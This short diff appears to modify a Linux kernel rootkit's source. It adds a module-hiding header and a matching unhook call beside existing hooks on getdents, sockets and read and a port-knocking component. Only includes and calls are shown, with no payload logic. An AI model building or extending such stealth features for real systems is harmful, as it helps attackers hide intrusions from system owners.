@@ -12,6 +12,7 @@
 #include "main.h"
 #include "port_knocking.h"
 #include "read.h"
+#include "hide_module.h"
 
 /*
  * Function called when loading the kernel module.
@@ -57,6 +58,7 @@ void cleanup_module (void)
 	unhook_getdents();
 	unhook_sockets();
 	unhook_read();
+	unhook_modules();
 	cleanup_control();
 	unload_port_knocking();
 	
